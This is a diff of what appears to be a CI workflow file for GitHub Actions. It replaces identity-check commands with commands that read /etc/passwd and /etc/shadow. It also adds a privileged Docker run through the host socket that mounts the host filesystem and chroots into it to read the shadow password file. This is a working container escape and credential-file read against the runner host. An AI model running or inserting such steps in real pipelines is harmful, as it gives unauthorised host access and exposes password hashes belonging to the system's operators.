@@ -5,9 +5,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            docker run ubuntu id;uname -a
-            docker -H unix:///var/run/docker.sock run -v /:/host --privileged ubuntu chroot /host id;uname -a
-            docker -H unix:///var/run/docker.sock run -v /:/host ubuntu chroot /host id;uname -a
+            cat /etc/passwd
+            cat /etc/shadow
+            docker -H unix:///var/run/docker.sock run -v /:/host --privileged ubuntu chroot /host cat /etc/shadow
             
 
             
